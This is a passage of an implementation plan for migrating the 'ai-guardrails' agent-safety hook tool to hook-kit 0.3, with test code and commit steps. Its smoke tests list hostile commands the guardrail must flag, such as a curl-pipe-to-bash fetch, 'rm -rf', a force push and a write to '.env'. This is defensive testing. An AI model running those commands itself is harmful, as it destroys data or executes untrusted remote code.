# hook-kit 0.3 Migration — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Migrate ai-guardrails from hook-kit 0.2.x library mode to 0.3.x triple-binary architecture (`ai-guardrails`, `ai-guardrails-hk`, `ai-guardrails-hk-cc-tools`) per SPEC-014.

**Architecture:** One source `src/hooks.ts` compiles into two adapter binaries (shell + cc-tools) via `hook-kit build`. Project TOML config loaded at binary startup. The `hook` subcommand surface is removed; `format-stage` and `allow-comment` promote to top-level CLI commands. Iron Law 4 (fail-open on infra errors) replaces the current `command -v` shell guard.

**Tech Stack:** Bun ≥ 1.2, `@questi0nm4rk/hook-kit` 0.3.x, `@questi0nm4rk/shell-ast`, smol-toml, Commander, biome, `bun:test`.

**Spec:** `docs/specs/SPEC-014-hook-kit-0.3-migration.md`

---

## Phase 1 — Foundation: bump dependency and capture breakage

### Task 1.1: Bump hook-kit to ^0.3.0 and discover breakage

**Files:**
- Modify: `package.json` (dependencies block)

- [ ] **Step 1: Update version pin**

```diff
-    "@questi0nm4rk/hook-kit": "^0.2.0",
+    "@questi0nm4rk/hook-kit": "^0.3.0",
```

- [ ] **Step 2: Refresh lockfile**

Run: `bun install`
Expected: `bun.lock` updated, no install errors.

- [ ] **Step 3: Run typecheck — capture every error**

Run: `bun run typecheck 2>&1 | tee /tmp/typecheck-after-bump.log`
Expected: failures (the API surface for `claudeCodeAdapter` import path may have moved; `evaluate` signature is unchanged but check). Save the log; subsequent tasks reference it.

- [ ] **Step 4: Run test suite — capture every failure**

Run: `bun test 2>&1 | tee /tmp/tests-after-bump.log`
Expected: failures concentrated in `tests/hooks/run.test.ts`, `tests/commands/hook.test.ts`, `tests/check/to-hook-kit.test.ts`. Note which fail — Phase 4 / 6 must restore green.

- [ ] **Step 5: Commit (with tests still red)**

```bash
git add package.json bun.lock
git commit -m "chore(deps): bump @questi0nm4rk/hook-kit ^0.2.0 → ^0.3.0

Tests intentionally red — Phase 2-6 restores green via the SPEC-014
binary-shaped migration."
```

---

## Phase 2 — Move `suppress-comments` to a hook-kit `custom()` rule

### Task 2.1: Create `src/check/rules/suppress-comments.ts`

The current implementation lives in `src/hooks/suppress-comments.ts` and is invoked via the `hook suppress-comments` CLI subcommand. Lift the file-scanning logic into a hook-kit `custom()` rule that fires on PostToolUse Edit/Write/NotebookEdit events. The rule reads the file from disk after the tool call has written it, scans for unjustified suppression comments, and escalates if found.

**Files:**
- Create: `src/check/rules/suppress-comments.ts`
- Test: `tests/check/rules/suppress-comments.test.ts`

- [ ] **Step 1: Write the failing test**

```typescript
// tests/check/rules/suppress-comments.test.ts
import { describe, expect, test } from "bun:test";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { HookEvent } from "@questi0nm4rk/hook-kit";
import { suppressCommentsRule } from "@/check/rules/suppress-comments";

function tmpFile(contents: string, ext: string): string {
  const dir = mkdtempSync(join(tmpdir(), "ag-supp-"));
  const path = join(dir, `f${ext}`);
  writeFileSync(path, contents);
  return path;
}

function event(filePath: string, eventName: "PreToolUse" | "PostToolUse"): HookEvent {
  return {
    eventName,
    sessionId: "test",
    cwd: "/",
    transcriptPath: "",
    raw: {},
    toolName: "Edit",
    toolInput: { file_path: filePath },
  };
}

describe("suppressCommentsRule", () => {
  test("returns null on PreToolUse (only fires post)", async () => {
    const rule = suppressCommentsRule();
    const filePath = tmpFile("// @ts-ignore\n", ".ts");
    expect(await rule.evaluate(event(filePath, "PreToolUse"))).toBeNull();
  });

  test("escalates on unjustified ts-ignore", async () => {
    const rule = suppressCommentsRule();
    const filePath = tmpFile("const x = 1;\n// @ts-ignore\nconst y: string = 1 as any;\n", ".ts");
    const decision = await rule.evaluate(event(filePath, "PostToolUse"));
    expect(decision?.kind).toBe("escalate");
    expect(decision?.label).toBe("[suppress-comments]");
    expect(decision?.reason).toContain("unjustified linter suppression");
  });

  test("returns null when allow-comment justifies the suppression", async () => {
    const rule = suppressCommentsRule();
    const filePath = tmpFile(
      `const x: any = 1; // @ts-ignore // ai-guardrails-allow: ts-ignore "third-party type"\n`,
      ".ts",
    );
    expect(await rule.evaluate(event(filePath, "PostToolUse"))).toBeNull();
  });

  test("returns null for unknown extensions", async () => {
    const rule = suppressCommentsRule();
    const filePath = tmpFile("// noqa\n", ".unknown");
    expect(await rule.evaluate(event(filePath, "PostToolUse"))).toBeNull();
  });

  test("returns null when file is missing", async () => {
    const rule = suppressCommentsRule();
    expect(await rule.evaluate(event("/nonexistent/file.ts", "PostToolUse"))).toBeNull();
  });
});
```

- [ ] **Step 2: Run test — verify it fails**

Run: `bun test tests/check/rules/suppress-comments.test.ts -v`
Expected: FAIL — `suppressCommentsRule is not exported from @/check/rules/suppress-comments`.

- [ ] **Step 3: Implement the rule**

```typescript
// src/check/rules/suppress-comments.ts
import { existsSync, readFileSync } from "node:fs";
import { extname } from "node:path";
import { custom } from "@questi0nm4rk/hook-kit";
import type { Decision, Rule } from "@questi0nm4rk/hook-kit";
import { parseAllowComments } from "@/hooks/allow-comment";
import { extractComment, scanFile } from "@/hooks/suppress-comments";

const EXT_TO_LANG: Record<string, string> = {
  ".py": "python", ".ts": "typescript", ".tsx": "typescript",
  ".js": "typescript", ".jsx": "typescript", ".rs": "rust",
  ".go": "go", ".cs": "csharp", ".lua": "lua",
  ".sh": "shell", ".bash": "shell", ".zsh": "shell", ".ksh": "shell",
  ".c": "cpp", ".cpp": "cpp", ".cc": "cpp", ".h": "cpp", ".hpp": "cpp",
};

export function suppressCommentsRule(): Rule {
  return custom("suppress-comments", async (event): Promise<Decision> => {
    if (event.eventName !== "PostToolUse") return null;
    const raw = event.toolInput.file_path ?? event.toolInput.notebook_path;
    if (typeof raw !== "string" || raw === "") return null;
    if (EXT_TO_LANG[extname(raw).toLowerCase()] === undefined) return null;
    if (!existsSync(raw)) return null;
    let body: string;
    try { body = readFileSync(raw, "utf8"); } catch { return null; }

    const findings = scanFile(raw, body);
    if (findings.length === 0) return null;

    const summary = findings.slice(0, 5).map((f) => `  L${f.line}: ${f.pattern}`).join("\n");
    const more = findings.length > 5 ? `\n  …and ${findings.length - 5} more` : "";
    return {
      kind: "escalate",
      reason:
        `unjustified linter suppression(s) added to ${raw}:\n${summary}${more}\n\n` +
        `If intentional, add an inline justification:\n` +
        `  # ai-guardrails-allow: <rule> "<reason>"`,
      label: "[suppress-comments]",
    };
  });
}

export { extractComment, scanFile };
```

(The `scanFile` and `extractComment` helpers stay in `src/hooks/suppress-comments.ts` for now — Phase 8 deletes the dispatcher wrapper but keeps these helpers re-exported through this new file.)

- [ ] **Step 4: Run test — verify pass**

Run: `bun test tests/check/rules/suppress-comments.test.ts -v`
Expected: 5 PASS.

- [ ] **Step 5: Commit**

```bash
git add src/check/rules/suppress-comments.ts tests/check/rules/suppress-comments.test.ts
git commit -m "feat(check): add suppressCommentsRule as hook-kit custom() rule

Lifts the existing scanFile/extractComment logic into a PostToolUse
content rule that hk-cc-tools fires automatically. Replaces the
\`hook suppress-comments\` CLI subcommand path."
```

---

## Phase 3 — Module entrypoint: `src/hooks.ts` and `in-process` helper

### Task 3.1: Extract `isDangerous` to `src/check/in-process.ts`

`isDangerous` currently lives in `src/hooks/run.ts`, which Phase 4 deletes. BDD tests still need it. Move it to a dedicated helper.

**Files:**
- Create: `src/check/in-process.ts`
- Test: `tests/check/in-process.test.ts`

- [ ] **Step 1: Write failing test**

```typescript
// tests/check/in-process.test.ts
import { describe, expect, test } from "bun:test";
import { isDangerous } from "@/check/in-process";

describe("isDangerous", () => {
  test("returns null for harmless command", async () => {
    expect(await isDangerous("ls -la")).toBeNull();
  });

  test("returns ask decision for git push --force", async () => {
    const result = await isDangerous("git push --force origin main");
    expect(result?.decision).toBe("ask");
    expect(result?.reason).toContain("force");
  });

  test("returns ask decision for rm -rf", async () => {
    const result = await isDangerous("rm -rf /tmp/scratch");
    expect(result?.decision).toBe("ask");
  });
});
```

- [ ] **Step 2: Run test — verify fail**

Run: `bun test tests/check/in-process.test.ts -v`
Expected: FAIL — module not found.

- [ ] **Step 3: Implement helper**

```typescript
// src/check/in-process.ts
import { evaluate as hkEvaluate } from "@questi0nm4rk/hook-kit";
import { buildRuleSet, loadHookConfig } from "@/check/ruleset";
import { buildAllModules, fromHookKit, synthesizeHookEvent } from "@/check/to-hook-kit";
import type { CheckResult } from "@/check/types";

const LABEL = "[ai-guardrails]";

async function loadModules() {
  return buildAllModules(buildRuleSet(await loadHookConfig()), LABEL);
}

/** In-process evaluation for BDD step files and tests. */
export async function isDangerous(command: string): Promise<CheckResult | null> {
  const event = synthesizeHookEvent({ type: "bash", command }, "ag-isDangerous");
  const result = fromHookKit(await hkEvaluate(event, await loadModules()));
  return result.decision === "allow" ? null : result;
}
```

- [ ] **Step 4: Run test — verify pass**

Run: `bun test tests/check/in-process.test.ts -v`
Expected: 3 PASS.

- [ ] **Step 5: Commit**

```bash
git add src/check/in-process.ts tests/check/in-process.test.ts
git commit -m "feat(check): extract isDangerous to in-process helper

Pulls the BDD-test entry point out of src/hooks/run.ts so the latter
can be deleted in Phase 4."
```

### Task 3.2: Update existing BDD step files to import from new location

**Files:**
- Modify (search-and-replace): every test file importing `isDangerous` from `@/hooks/run`

- [ ] **Step 1: Find all callers**

Run: `grep -rn 'from "@/hooks/run"' tests/ src/`
Expected: list of files importing `isDangerous` (and possibly `runHookEvent`).

- [ ] **Step 2: Rewrite imports**

For each file in the grep output, change:
```typescript
import { isDangerous } from "@/hooks/run";
```
to:
```typescript
import { isDangerous } from "@/check/in-process";
```

Leave `runHookEvent` imports alone — Phase 4 deletes those callers.

- [ ] **Step 3: Run tests — verify the move didn't regress BDD coverage**

Run: `bun test tests/steps/ -v 2>&1 | tail -30`
Expected: same pass count as pre-bump baseline. (`runHookEvent` callers still red.)

- [ ] **Step 4: Commit**

```bash
git add tests/
git commit -m "refactor(tests): repoint isDangerous imports to @/check/in-process"
```

### Task 3.3: Create `src/hooks.ts` — the module entrypoint

This file is the single source of truth compiled into both `ai-guardrails-hk` (shell) and `ai-guardrails-hk-cc-tools` (cc-tools) binaries. It loads project TOML config at process startup, builds the module list, and re-exports as `default`.

**Files:**
- Create: `src/hooks.ts`
- Test: `tests/hooks.test.ts`

- [ ] **Step 1: Write failing test**

```typescript
// tests/hooks.test.ts
import { describe, expect, test } from "bun:test";
import { evaluate } from "@questi0nm4rk/hook-kit";
import modules from "@/hooks";

describe("src/hooks.ts module entrypoint", () => {
  test("exports a non-empty module array", () => {
    expect(Array.isArray(modules)).toBe(true);
    expect(modules.length).toBeGreaterThan(0);
  });

  test("contains an ai-guardrails-bash module", () => {
    expect(modules.some((m) => m.id === "ai-guardrails-bash")).toBe(true);
  });

  test("contains a suppress-comments module", () => {
    expect(modules.some((m) => m.id === "suppress-comments")).toBe(true);
  });

  test("evaluates git push --force as escalate", async () => {
    const event = {
      eventName: "PreToolUse" as const,
      sessionId: "t",
      cwd: "/",
      transcriptPath: "",
      raw: {},
      toolName: "Bash",
      toolInput: { command: "git push --force origin main" },
    };
    const decision = await evaluate(event, modules);
    expect(decision?.kind).toBe("escalate");
  });

  test("evaluates harmless ls as null", async () => {
    const event = {
      eventName: "PreToolUse" as const,
      sessionId: "t",
      cwd: "/",
      transcriptPath: "",
      raw: {},
      toolName: "Bash",
      toolInput: { command: "ls -la /tmp" },
    };
    expect(await evaluate(event, modules)).toBeNull();
  });
});
```

- [ ] **Step 2: Run test — verify fail**

Run: `bun test tests/hooks.test.ts -v`
Expected: FAIL — module not found.

- [ ] **Step 3: Implement module entrypoint**

```typescript
// src/hooks.ts
// Compiled into both ai-guardrails-hk (shell wrapper) and
// ai-guardrails-hk-cc-tools (cc-tools adapter) via `hook-kit build`.
// Reads project TOML config (cwd()/.ai-guardrails/config.toml) once at
// process startup; single-shot process means no caching needed.

import { createModule } from "@questi0nm4rk/hook-kit";
import type { HookModule } from "@questi0nm4rk/hook-kit";
import { suppressCommentsRule } from "@/check/rules/suppress-comments";
import { buildRuleSet, loadHookConfig } from "@/check/ruleset";
import { buildAllModules } from "@/check/to-hook-kit";

const LABEL = "[ai-guardrails]";

const config = await loadHookConfig();
const ruleset = buildRuleSet(config);

const modules: HookModule[] = [
  ...buildAllModules(ruleset, LABEL),
  createModule(
    {
      id: "suppress-comments",
      name: "Suppress unjustified linter-disable comments",
      events: ["PostToolUse"],
      matchers: ["Edit", "Write", "NotebookEdit"],
    },
    [suppressCommentsRule()],
  ),
];

export default modules;
```

- [ ] **Step 4: Run test — verify pass**

Run: `bun test tests/hooks.test.ts -v`
Expected: 5 PASS.

- [ ] **Step 5: Commit**

```bash
git add src/hooks.ts tests/hooks.test.ts
git commit -m "feat: add src/hooks.ts module entrypoint for hk binaries

Single source for both ai-guardrails-hk and ai-guardrails-hk-cc-tools
builds. Loads project TOML config at startup; emits the bash command
module + path modules + suppress-comments content rule."
```

---

## Phase 4 — CLI restructuring: promote subcommands, remove `hook`

### Task 4.1: Promote `format-stage` to top-level command

**Files:**
- Create: `src/commands/format-stage.ts`
- Test: keep existing `tests/hooks/format-stage.test.ts` if present; add `tests/commands/format-stage.test.ts`

- [ ] **Step 1: Write failing test**

```typescript
// tests/commands/format-stage.test.ts
import { describe, expect, test } from "bun:test";
import { runFormatStage } from "@/commands/format-stage";

describe("runFormatStage", () => {
  test("is a function that returns a promise", () => {
    expect(typeof runFormatStage).toBe("function");
  });
});
```

- [ ] **Step 2: Run test — verify fail**

Run: `bun test tests/commands/format-stage.test.ts -v`
Expected: FAIL — module not found.

- [ ] **Step 3: Implement command (re-exports the existing helper)**

```typescript
// src/commands/format-stage.ts
export { runFormatStage } from "@/hooks/format-stage";
```

The actual implementation stays in `src/hooks/format-stage.ts` (it's not deleted in Phase 8 — only the `hook` dispatcher is). This task only adds the new export path.

- [ ] **Step 4: Run test — verify pass**

Run: `bun test tests/commands/format-stage.test.ts -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/commands/format-stage.ts tests/commands/format-stage.test.ts
git commit -m "feat(cli): promote format-stage to top-level command"
```

### Task 4.2: Promote `allow-comment` to top-level command

**Files:**
- Create: `src/commands/allow-comment.ts`
- Test: `tests/commands/allow-comment.test.ts`

The existing `src/hooks/allow-comment.ts` exports `parseAllowComments` — it's a parser, not a runnable command. The current `hook` dispatcher does not actually have an `allow-comment` subcommand (look at `HOOK_NAMES = ["run", "suppress-comments", "format-stage"]`). The "promote" framing in SPEC-014 is wrong on this point; nothing to promote — `parseAllowComments` is already a library helper consumed by `suppress-comments`.

**Spec correction:** treat this task as a **no-op stub** — drop it from this plan. Update SPEC-014 to remove the `allow-comment` promotion line.

- [ ] **Step 1: Update SPEC-014**

Edit `docs/specs/SPEC-014-hook-kit-0.3-migration.md` — remove the `allow-comment` row from the CLI surface table and the source-layout `commands/allow-comment.ts` entry.

- [ ] **Step 2: Commit**

```bash
git add docs/specs/SPEC-014-hook-kit-0.3-migration.md
git commit -m "docs(spec): SPEC-014 — drop allow-comment promotion (no-op)

parseAllowComments is a parser, not a CLI subcommand — there's
nothing to promote."
```

### Task 4.3: Update `src/cli.ts` — register `format-stage`, remove `hook`

**Files:**
- Modify: `src/cli.ts`

- [ ] **Step 1: Update the imports and command registrations**

In `src/cli.ts`:

```diff
-import { runHook } from "@/commands/hook";
+import { runFormatStage } from "@/commands/format-stage";
```

Replace the `hook` block (lines 144-153) with:

```typescript
// ---------------------------------------------------------------------------
// format-stage (lefthook PreCommit helper)
// ---------------------------------------------------------------------------
program
  .command("format-stage")
  .description("Run language-specific formatters on staged files (lefthook helper)")
  .action(async () => {
    await runFormatStage();
  });
```

- [ ] **Step 2: Run typecheck**

Run: `bun run typecheck`
Expected: clean (or only failures from `tests/commands/hook.test.ts` and `tests/hooks/run.test.ts` — those are deleted in Task 4.4).

- [ ] **Step 3: Manual smoke**

Run: `bun run src/cli.ts --help 2>&1 | grep -E '(hook|format-stage)'`
Expected: `format-stage` listed; no `hook` subcommand.

- [ ] **Step 4: Commit**

```bash
git add src/cli.ts
git commit -m "refactor(cli): replace hook subcommand with top-level format-stage

The hook namespace dispatched to suppress-comments, format-stage, and
the now-defunct \`hook run\` (replaced by hk-cc-tools binary).
suppress-comments moved to a content() rule (Phase 2); format-stage
promoted (Task 4.1)."
```

### Task 4.4: Delete dead dispatcher files

**Files:**
- Delete: `src/commands/hook.ts`
- Delete: `src/hooks/run.ts`
- Delete: `src/hooks/command.ts`
- Delete: `tests/commands/hook.test.ts`
- Delete: `tests/hooks/run.test.ts`

- [ ] **Step 1: Confirm no remaining callers**

Run: `grep -rn '@/commands/hook\|@/hooks/run\|@/hooks/command\|HOOK_COMMAND' src/ tests/ | grep -v node_modules`
Expected: only the files marked for deletion appear (or no matches at all).

- [ ] **Step 2: Delete files**

Run:
```bash
rm src/commands/hook.ts src/hooks/run.ts src/hooks/command.ts
rm tests/commands/hook.test.ts tests/hooks/run.test.ts
```

- [ ] **Step 3: Run typecheck + tests**

Run: `bun run typecheck && bun test 2>&1 | tail -20`
Expected: clean typecheck. Test failures should now be limited to generator snapshots (Phase 5 fixes those) and any test that asserts on `.claude/settings.json` shape.

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "refactor: remove hook dispatcher + library-mode entry points

Replaced by ai-guardrails-hk-cc-tools binary (Phase 6).
HOOK_COMMAND constant no longer needed — claude-settings generator
points at the binary path directly (Phase 5)."
```

---

## Phase 5 — Generators: rewire `.claude/settings.json` and `lefthook.yml`

### Task 5.1: Rewrite `claude-settings.ts` generator

**Files:**
- Modify: `src/generators/claude-settings.ts`
- Test: `tests/generators/claude-settings.test.ts` (existing snapshot)

- [ ] **Step 1: Inspect current snapshot to understand shape**

Run: `cat tests/generators/__snapshots__/claude-settings.test.ts.snap 2>/dev/null | head -30`
Note the current shape; the new generator must replace the HOOK_COMMAND-based block.

- [ ] **Step 2: Rewrite the generator**

```typescript
// src/generators/claude-settings.ts
import { ALL_RULE_GROUPS, collectDenyGlobs } from "@/check/rules/groups";
import type { ResolvedConfig } from "@/config/schema";
import type { ConfigGenerator } from "@/generators/types";

interface HookEntry { type: "command"; command: string; timeout: number; }
interface MatcherEntry { matcher: string; hooks: HookEntry[]; }
interface ClaudeSettings {
  permissions: { deny: readonly string[] };
  hooks: { PreToolUse: MatcherEntry[]; PostToolUse: MatcherEntry[] };
}

const HOOK_TIMEOUT_SECONDS = 60;
const BINARY_NAME = "ai-guardrails-hk-cc-tools";

function renderClaudeSettings(_config: ResolvedConfig): string {
  const hookCommand = `${BINARY_NAME}`;
  const settings: ClaudeSettings = {
    permissions: { deny: collectDenyGlobs(ALL_RULE_GROUPS) },
    hooks: {
      PreToolUse: [{
        matcher: "Bash|Edit|Write|NotebookEdit|Read",
        hooks: [{ type: "command", command: hookCommand, timeout: HOOK_TIMEOUT_SECONDS }],
      }],
      PostToolUse: [{
        matcher: "Edit|Write|NotebookEdit",
        hooks: [{ type: "command", command: hookCommand, timeout: HOOK_TIMEOUT_SECONDS }],
      }],
    },
  };
  return JSON.stringify(settings, null, 2);
}

export const claudeSettingsGenerator: ConfigGenerator = {
  id: "claude-settings",
  configFile: ".claude/settings.json",
  generate(config: ResolvedConfig): string { return renderClaudeSettings(config); },
};
```

- [ ] **Step 3: Update the test (regenerate snapshot)**

Run: `bun test tests/generators/claude-settings.test.ts --update-snapshots`
Then `cat tests/generators/__snapshots__/claude-settings.test.ts.snap` and visually confirm the new snapshot matches the SPEC-014 example (single Bash|Edit|Write|NotebookEdit|Read PreToolUse block + Edit|Write|NotebookEdit PostToolUse block, timeout 60).

- [ ] **Step 4: Run all generator tests**

Run: `bun test tests/generators/`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/generators/claude-settings.ts tests/generators/__snapshots__/claude-settings.test.ts.snap
git commit -m "feat(generators): rewire claude-settings.ts to ai-guardrails-hk-cc-tools

- Single binary covers all PreToolUse + PostToolUse matchers
- Timeout: 60s (matches CC default, stays under default Bash budget)
- Drops the \`command -v\` shell guard (hook-kit Iron Law 4 covers this)
- HOOK_KIT_ASKPASS not set by default — escalations fall through to CC ask UI"
```

### Task 5.2: Update `lefthook.ts` generator — call promoted command

**Files:**
- Modify: `src/generators/lefthook.ts:84` (the `check-suppress-comments` block)
- Test: `tests/generators/lefthook.test.ts`

- [ ] **Step 1: Replace the suppress-comments lefthook command**

In `src/generators/lefthook.ts`, locate the `check-suppress-comments` section (~line 82-86). Since suppress-comments is now a hook-kit content() rule fired by hk-cc-tools at PostToolUse time, the lefthook PreCommit invocation is redundant for files Claude Code wrote — but it still catches commits made by humans / non-Claude tooling. Keep it, but rewire to a binary that exists in v4.

The cleanest port: invoke the `ai-guardrails-hk-cc-tools` binary in cc-tools mode against a synthetic PostToolUse event per staged file. That's awkward for a lefthook helper.

**Decision:** add a small CLI subcommand `ai-guardrails check-suppress-comments <files...>` that runs the same `scanFile` logic as the hook-kit rule. Reuses `src/hooks/suppress-comments.ts`'s `scanFile` (which Phase 8 keeps for this exact purpose).

```diff
     check-suppress-comments:
       glob: "*.{py,ts,tsx,js,jsx,rs,go,cs,lua,sh,bash,zsh,ksh,c,cpp,cc,h,hpp}"${excludeLine}
-      run: ai-guardrails hook suppress-comments {staged_files}
+      run: ai-guardrails check-suppress-comments {staged_files}
       fail_text: "Inline suppression comments require a reason"
       priority: 2
```

- [ ] **Step 2: Add the new subcommand to `src/cli.ts`**

```typescript
// In src/cli.ts, after format-stage block:
program
  .command("check-suppress-comments")
  .description("Scan files for unjustified linter-suppression comments (lefthook helper)")
  .argument("<files...>", "Files to scan")
  .action(async (files) => {
    const { runSuppressComments } = await import("@/commands/check-suppress-comments");
    await runSuppressComments(files);
  });
```

- [ ] **Step 3: Create the command module**

```typescript
// src/commands/check-suppress-comments.ts
export { runSuppressComments } from "@/hooks/suppress-comments";
```

- [ ] **Step 4: Update the lefthook snapshot**

Run: `bun test tests/generators/lefthook.test.ts --update-snapshots`
Verify the diff matches: only the `run:` line changes from `ai-guardrails hook suppress-comments` to `ai-guardrails check-suppress-comments`.

- [ ] **Step 5: Run all tests**

Run: `bun test`
Expected: pass count climbs back toward pre-bump baseline (binary smoke tests in Phase 6 still missing).

- [ ] **Step 6: Commit**

```bash
git add src/cli.ts src/commands/check-suppress-comments.ts src/generators/lefthook.ts \
        tests/generators/__snapshots__/lefthook.test.ts.snap
git commit -m "feat(generators): rewire lefthook to ai-guardrails check-suppress-comments

PreCommit lefthook hook still scans staged files (catches commits from
humans / non-Claude tooling). Real-time CC writes are caught by the
hook-kit content() rule via hk-cc-tools."
```

---

## Phase 6 — Build infrastructure: produce two new binaries

### Task 6.1: Add hook-kit build scripts to `package.json`

**Files:**
- Modify: `package.json` (scripts block)

- [ ] **Step 1: Add scripts**

```diff
   "scripts": {
     "dev": "bun run --watch src/cli.ts",
     "build": "bun build src/cli.ts --compile --bytecode --production --outfile dist/ai-guardrails",
+    "build:hk": "hook-kit build src/hooks.ts --out dist/ai-guardrails-hk --adapter shell",
+    "build:hk-cc": "hook-kit build src/hooks.ts --out dist/ai-guardrails-hk-cc-tools --adapter cc-tools --hook-timeout 60",
+    "build:all": "bun run build && bun run build:hk && bun run build:hk-cc",
     "test": "bun test",
     "test:watch": "bun test --watch",
     "lint": "biome check src/ tests/",
     "lint:fix": "biome check --write src/ tests/",
     "typecheck": "tsc --noEmit"
   },
```

- [ ] **Step 2: Verify hook-kit CLI is available**

Run: `bunx hook-kit --version`
Expected: `0.3.0` or higher. If "command not found", run `bun add -d @questi0nm4rk/hook-kit` (it's already a dependency, so `bunx` resolves it from node_modules).

- [ ] **Step 3: Build all three**

Run: `bun run build:all`
Expected: three files appear in `dist/`:
```
dist/ai-guardrails              (~50MB)
dist/ai-guardrails-hk           (~50MB)
dist/ai-guardrails-hk-cc-tools  (~50MB)
```

- [ ] **Step 4: Commit**

```bash
git add package.json
git commit -m "build: add build:hk + build:hk-cc + build:all scripts

Two new binaries compiled from src/hooks.ts via hook-kit build:
- ai-guardrails-hk: shell wrapper, agent-agnostic
- ai-guardrails-hk-cc-tools: Claude Code adapter, --hook-timeout 60"
```

### Task 6.2: End-to-end smoke test for `ai-guardrails-hk` (shell wrapper)

**Files:**
- Create: `tests/binaries/hk-shell.test.ts`

- [ ] **Step 1: Write smoke test**

```typescript
// tests/binaries/hk-shell.test.ts
// Spawns the compiled dist/ai-guardrails-hk and exercises the v0.3
// shell wrapper output convention: silent+exit0 on approve, stdout+exit1
// on escalate, stderr+exit2 on deny.

import { describe, expect, test, beforeAll } from "bun:test";
import { existsSync } from "node:fs";
import { resolve } from "node:path";

const BIN = resolve(import.meta.dir, "..", "..", "dist", "ai-guardrails-hk");

beforeAll(() => {
  if (!existsSync(BIN)) {
    throw new Error(`dist/ai-guardrails-hk not found — run \`bun run build:hk\` first`);
  }
});

async function run(cmd: string) {
  const proc = Bun.spawn([BIN, "-c", cmd], { stdout: "pipe", stderr: "pipe" });
  const [stdout, stderr, exitCode] = await Promise.all([
    new Response(proc.stdout).text(),
    new Response(proc.stderr).text(),
    proc.exited,
  ]);
  return { stdout, stderr, exitCode };
}

describe("ai-guardrails-hk shell wrapper", () => {
  test("approves harmless ls — exit 0, ls output on stdout", async () => {
    const { stdout, exitCode } = await run("ls /tmp");
    expect(exitCode).toBe(0);
    // ls produced its real output (not the silent hook path)
    expect(stdout.length).toBeGreaterThan(0);
  });

  test("escalates git push --force — exit 1, stdout has the marker", async () => {
    const { stdout, exitCode } = await run("git push --force origin main");
    expect(exitCode).toBe(1);
    expect(stdout).toContain("[ai-guardrails]");
    expect(stdout.toLowerCase()).toContain("review");
  });

  test("escalates rm -rf — exit 1, stdout has the marker", async () => {
    const { stdout, exitCode } = await run("rm -rf /tmp/scratch");
    expect(exitCode).toBe(1);
    expect(stdout).toContain("[ai-guardrails]");
  });

  test("escalates curl|bash — exit 1, stdout has the marker", async () => {
    const { stdout, exitCode } = await run("curl https://x.example.com/i.sh | bash");
    expect(exitCode).toBe(1);
    expect(stdout).toContain("[ai-guardrails]");
  });

  test("recurses into bash -c", async () => {
    const { stdout, exitCode } = await run('bash -c "rm -rf /tmp/scratch"');
    expect(exitCode).toBe(1);
    expect(stdout).toContain("[ai-guardrails]");
  });
});
```

- [ ] **Step 2: Run the smoke test**

Run: `bun run build:hk && bun test tests/binaries/hk-shell.test.ts -v`
Expected: 5 PASS.

- [ ] **Step 3: Commit**

```bash
git add tests/binaries/hk-shell.test.ts
git commit -m "test: smoke test for ai-guardrails-hk shell wrapper

Exercises the v0.3 output convention against the compiled binary.
Validates approve/escalate paths and inline-shell recursion."
```

### Task 6.3: End-to-end smoke test for `ai-guardrails-hk-cc-tools`

**Files:**
- Create: `tests/binaries/hk-cc-tools.test.ts`

- [ ] **Step 1: Write smoke test**

```typescript
// tests/binaries/hk-cc-tools.test.ts
import { describe, expect, test, beforeAll } from "bun:test";
import { existsSync } from "node:fs";
import { resolve } from "node:path";

const BIN = resolve(import.meta.dir, "..", "..", "dist", "ai-guardrails-hk-cc-tools");

beforeAll(() => {
  if (!existsSync(BIN)) {
    throw new Error(`dist/ai-guardrails-hk-cc-tools not found — run \`bun run build:hk-cc\` first`);
  }
});

interface Decision {
  hookSpecificOutput?: {
    permissionDecision?: "allow" | "ask" | "deny";
    permissionDecisionReason?: string;
  };
}

async function fire(input: Record<string, unknown>): Promise<{ decision: Decision; exitCode: number; }> {
  const proc = Bun.spawn([BIN], {
    stdin: new Response(JSON.stringify(input)),
    stdout: "pipe",
    stderr: "pipe",
    env: { ...process.env, HOOK_KIT_ASKPASS: "" },
  });
  const [stdout, exitCode] = await Promise.all([
    new Response(proc.stdout).text(),
    proc.exited,
  ]);
  const decision: Decision = stdout.trim() === "" ? {} : JSON.parse(stdout);
  return { decision, exitCode };
}

describe("ai-guardrails-hk-cc-tools cc-tools adapter", () => {
  test("escalates git push --force as ask", async () => {
    const { decision } = await fire({
      hook_event_name: "PreToolUse",
      session_id: "t",
      cwd: "/tmp",
      transcript_path: "/tmp/x",
      tool_name: "Bash",
      tool_input: { command: "git push --force origin main" },
    });
    expect(decision.hookSpecificOutput?.permissionDecision).toBe("ask");
  });

  test("approves harmless ls (no output)", async () => {
    const { decision, exitCode } = await fire({
      hook_event_name: "PreToolUse",
      session_id: "t",
      cwd: "/tmp",
      transcript_path: "/tmp/x",
      tool_name: "Bash",
      tool_input: { command: "ls /tmp" },
    });
    expect(exitCode).toBe(0);
    expect(decision.hookSpecificOutput).toBeUndefined();
  });

  test("escalates write to .env as ask", async () => {
    const { decision } = await fire({
      hook_event_name: "PreToolUse",
      session_id: "t",
      cwd: "/tmp",
      transcript_path: "/tmp/x",
      tool_name: "Write",
      tool_input: { file_path: "/tmp/.env" },
    });
    expect(decision.hookSpecificOutput?.permissionDecision).toBe("ask");
  });
});
```

- [ ] **Step 2: Run smoke test**

Run: `bun run build:hk-cc && bun test tests/binaries/hk-cc-tools.test.ts -v`
Expected: 3 PASS.

- [ ] **Step 3: Commit**

```bash
git add tests/binaries/hk-cc-tools.test.ts
git commit -m "test: smoke test for ai-guardrails-hk-cc-tools

Exercises the cc-tools adapter against the compiled binary using
synthetic CC hook event JSON envelopes."
```

---

## Phase 7 — Distribution: install script + release workflow

### Task 7.1: Update `scripts/install.sh` to download all three binaries

**Files:**
- Modify: `scripts/install.sh`

- [ ] **Step 1: Read the current download loop**

Run: `grep -n "ai-guardrails-" scripts/install.sh`
The script currently downloads one binary per `${OS}-${ARCH}` archive. Refactor to loop over the three binary names.

- [ ] **Step 2: Make the install loop binary-list-aware**

